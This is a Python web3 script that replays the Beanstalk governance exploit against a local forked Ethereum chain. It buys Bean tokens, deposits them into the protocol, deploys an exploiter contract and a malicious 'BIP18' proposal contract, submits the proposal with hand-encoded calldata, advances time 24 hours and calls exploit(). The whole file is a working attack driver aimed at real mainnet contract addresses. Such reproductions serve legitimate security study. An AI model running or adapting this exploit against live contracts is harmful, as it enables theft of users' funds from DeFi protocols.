from eth_account.account import Account
from eth_account.signers.local import LocalAccount
from web3 import Web3
import json
import requests
import os
import time
import solcx

global path_to_exploit_dir
path_to_exploit_dir = '/root/foundry_hacks/beanstalkHack/' # Set your git repo path here

os.chdir(path_to_exploit_dir+'/src/exploit/')
solcx.set_solc_version('0.8.10')

def get_abi(contract_address: str, abi_path='/root/security/ABIs/'):
    """
        Get contract abi from ABIs folder if exists, else download from etherscan API
    """
    contract_address = contract_address.lower()
    if contract_address + '.json' in os.listdir(abi_path):
        return json.load(open(abi_path+contract_address+'.json'))
    abi = json.loads(requests.get('https://api.etherscan.io/api?module=contract&action=getabi&address={}'.format(contract_address.lower())).json()['result'])
    json.dump(abi, open(abi_path+contract_address + '.json', 'w'))
    return abi

def deploy_proposal_contract(address: str, from_address: str, gas: int,):
    """
        Deploy Bip18 proposal
    """
    data = solcx.compile_files(['BIP18.sol'],
                                output_values=['abi', 'bin'],
                                base_path=path_to_exploit_dir+'/src/'
                                )
    bytecode = data['exploit/BIP18.sol:BIP18']['bin']
    abi = data['exploit/BIP18.sol:BIP18']['abi']
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx_hash = contract.constructor(address).transact({'from': from_address, 'gas': gas})
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_receipt, w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

def deploy_exploiter_contract(from_address: str, gas: int,):
    """
        Deploy Exploiter contract
    """
    data = solcx.compile_files(['BeanExploit.sol'],
                                output_values=['abi', 'bin'],
                                base_path=path_to_exploit_dir+'/src/'
                                )
    bytecode = data['exploit/BeanExploit.sol:BeanExploit']['bin']
    abi = data['exploit/BeanExploit.sol:BeanExploit']['abi']
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx_hash = contract.constructor().transact({'from': from_address, 'gas': gas})
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_receipt, w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

w3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))
# Set to one of hardhat's default keys
ETH_ACCOUNT_FROM: LocalAccount = Account.from_key("0xdf57089febbacf7ba0bc227dafbffa9fc08a93fdc68e1e42411a14efcf23656e")


uniswap_v2_address = w3.toChecksumAddress('0x7a250d5630b4cf539739df2c5dacb4c659f2488d')
bean_address = w3.toChecksumAddress('0xdc59ac4fefa32293a95889dc396682858d52e5db')
weth_address = w3.toChecksumAddress('0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')
beanstalk_protocol_address = w3.toChecksumAddress('0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5')


uniswap_contract = w3.eth.contract(uniswap_v2_address, abi=get_abi(uniswap_v2_address))
bean_contract = w3.eth.contract(bean_address, abi=get_abi(bean_address))
beanstalk_protocol_contract = w3.eth.contract(beanstalk_protocol_address, abi=get_abi(beanstalk_protocol_address))

#  Tx1
#  Buy BeanStalk
buy_tx = uniswap_contract.functions.swapExactETHForTokens(211000000000, 
                                                          [weth_address, bean_address],
                                                          ETH_ACCOUNT_FROM.address,
                                                          1751425999).buildTransaction({'value': 73*10**18,
                                                                                'gas': 2000000,
                                                                                'chainId': w3.eth.chainId,
                                                                                'maxFeePerGas': w3.eth.getBlock(
                                                                                    'latest').baseFeePerGas + 10 ** 9,
                                                                                'maxPriorityFeePerGas': 10 ** 9,
                                                                                'nonce': w3.eth.getTransactionCount(
                                                                                    ETH_ACCOUNT_FROM.address)
                                                                                })  
buy_tx = ETH_ACCOUNT_FROM.sign_transaction(buy_tx)       
tx_hash = w3.eth.send_raw_transaction(buy_tx.rawTransaction)         
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
#time.sleep(5)

#  Check bean balance
print('Bean balance :', bean_contract.functions.balanceOf(ETH_ACCOUNT_FROM.address).call())

#  Tx2
#  Approve bean
approve_tx = bean_contract.functions.approve(beanstalk_protocol_address, 10**18).buildTransaction({
                                                                                'gas': 2000000,
                                                                                'chainId': w3.eth.chainId,
                                                                                'maxFeePerGas': w3.eth.getBlock(
                                                                                    'latest').baseFeePerGas + 10 ** 9,
                                                                                'maxPriorityFeePerGas': 10 ** 9,
                                                                                'nonce': w3.eth.getTransactionCount(
                                                                                    ETH_ACCOUNT_FROM.address)
                                                                                })
approve_tx = ETH_ACCOUNT_FROM.sign_transaction(approve_tx)       
tx_hash = w3.eth.send_raw_transaction(approve_tx.rawTransaction)         
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)         

#  Tx3
#  Deposit Beans to BeanStalk
deposit_tx = {
              'gas': 2000000,
              'chainId': w3.eth.chainId,
              'maxFeePerGas': w3.eth.getBlock('latest').baseFeePerGas + 10 ** 9,
              'maxPriorityFeePerGas': 10 ** 9,
              'nonce': w3.eth.getTransactionCount(ETH_ACCOUNT_FROM.address),
              'to': beanstalk_protocol_address,
              'data': '0x75ce258d00000000000000000000000000000000000000000000000000000030534dcb99'
            }
deposit_tx = ETH_ACCOUNT_FROM.sign_transaction(deposit_tx)
tx_hash = w3.eth.send_raw_transaction(deposit_tx.rawTransaction)         
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)   

#  Tx4 
#  Deploy Exploiter contract
receipt_exploiter, contract_exploiter = deploy_exploiter_contract(ETH_ACCOUNT_FROM.address, 5*10**6)

#  Tx5 
#  Deploy Proposal contract
receipt_proposal_contract, contract_proposal = deploy_proposal_contract(receipt_exploiter.contractAddress, ETH_ACCOUNT_FROM.address, 5*10**6)

#  Tx6 
#  Make proposal
proposal_tx = {
               'gas': 2000000,
               'chainId': w3.eth.chainId,
               'maxFeePerGas': w3.eth.getBlock('latest').baseFeePerGas + 10 ** 9,
               'maxPriorityFeePerGas': 10 ** 9,
               'nonce': w3.eth.getTransactionCount(ETH_ACCOUNT_FROM.address),
               'to': beanstalk_protocol_address, 
               'data':'0x956afd680000000000000000000000000000000000000000000000000000000000000080000000000000000000000000{}00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004e1c7392a00000000000000000000000000000000000000000000000000000000'.format(contract_exploiter.address[2:])
               }
proposal_tx = ETH_ACCOUNT_FROM.sign_transaction(proposal_tx)
tx_hash = w3.eth.send_raw_transaction(proposal_tx.rawTransaction)         
receipt = w3.eth.wait_for_transaction_receipt(tx_hash) 

#  Send 0.25eth to proposal contract
# send_tx = {
#            'value': w3.toWei(0.25, 'ether'), 
#            'gas': 2000000,
#            'chainId': w3.eth.chainId,
#            'maxFeePerGas': w3.eth.getBlock('latest').baseFeePerGas + 10 ** 9,
#            'maxPriorityFeePerGas': 10 ** 9,
#            'nonce': w3.eth.getTransactionCount(ETH_ACCOUNT_FROM.address),
#            'to': contract_proposal.address,
#            }
# send_tx = ETH_ACCOUNT_FROM.sign_transaction(send_tx)
# tx_hash = w3.eth.send_raw_transaction(send_tx.rawTransaction)         
# receipt = w3.eth.wait_for_transaction_receipt(tx_hash) 

#  Wait 24h
w3.provider.make_request('evm_increaseTime', [24*3600+1])

#  Transact contract_exploiter.exploit()

attack_tx = {
               'gas': int(10**7),
               'chainId': w3.eth.chainId,
               'maxFeePerGas': w3.eth.getBlock('latest').baseFeePerGas + 10 ** 9,
               'maxPriorityFeePerGas': 10 ** 9,
               'nonce': w3.eth.getTransactionCount(ETH_ACCOUNT_FROM.address),
            }
attack_tx= contract_exploiter.functions.exploit().buildTransaction(attack_tx)
attack_tx = ETH_ACCOUNT_FROM.sign_transaction(attack_tx)       
tx_hash = w3.eth.send_raw_transaction(attack_tx.rawTransaction)         
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)  

